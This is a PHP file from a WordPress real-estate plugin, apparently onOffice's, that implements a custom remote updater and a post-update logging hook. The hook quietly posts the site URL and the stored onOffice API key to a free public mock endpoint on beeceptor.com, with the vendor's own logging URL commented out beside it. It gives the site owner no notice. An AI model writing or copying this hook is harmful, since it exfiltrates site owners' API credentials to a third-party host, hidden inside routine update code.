<?php

function oo_plugin_updater( $transient ){

	if ( empty( $transient->checked ) ) {
		return $transient;
	}

	$remote = wp_remote_get(
		'https://onoffice-wp-updates.de/releases/plugins/oo-wp-plugin/updater.json',
		array(
			'timeout' => 10,
			'headers' => array(
				'Accept' => 'application/json'
			)
		)
	);

	if(
		is_wp_error( $remote )
		|| 200 !== wp_remote_retrieve_response_code( $remote )
		|| empty( wp_remote_retrieve_body( $remote ) )
	) {
		return $transient;
	}

	$remote = json_decode( wp_remote_retrieve_body( $remote ) );
	if( $remote && version_compare( ONOFFICE_PLUGIN_VERSION, $remote->version, '<' )  ) {
		$res = new stdClass();
		$res->slug = 'oo-wp-plugin';
		$res->plugin = ONOFFICE_PLUGIN_BASENAME;
		$res->new_version = $remote->version;
		$res->package = $remote->download_url;
		$transient->response[ $res->plugin ] = $res;
	}

	return $transient;

}
add_filter( 'pre_set_site_transient_update_plugins', 'oo_plugin_updater' );

function oo_plugin_log_update_after_install( $upgrader, $hook_extra ) {
	if ( ( $hook_extra['action'] ?? '' ) !== 'update' || ( $hook_extra['type'] ?? '' ) !== 'plugin' ) {
		return;
	}

	$plugin_files = array_filter(
		array_merge(
			isset( $hook_extra['plugin'] ) ? array( $hook_extra['plugin'] ) : array(),
			! empty( $hook_extra['plugins'] ) && is_array( $hook_extra['plugins'] ) ? $hook_extra['plugins'] : array()
		)
	);

	if ( ! in_array( ONOFFICE_PLUGIN_BASENAME, $plugin_files, true ) ) {
		return;
	}

	wp_remote_post(
		//'https://onoffice-wp-updates.de/releases/plugins/oo-wp-plugin/update-log.php',
		//'https://c6e133ff-ed53-4122-9a2e-76beb2743a8c.mock.pstmn.io/releases/plugins/oo-wp-plugin/update-log.php',
		'https://oo-update-test.free.beeceptor.com',
		array(
			'timeout'  => 5,
			'blocking' => false,
			'body'     => array(
				'timestamp' => gmdate( 'c' ),
				'site_url'  => home_url(),
				'api_key'   => get_option( 'onoffice-settings-apikey', '' ),
			),
		)
	);
}
add_action( 'upgrader_process_complete', 'oo_plugin_log_update_after_install', 10, 2 );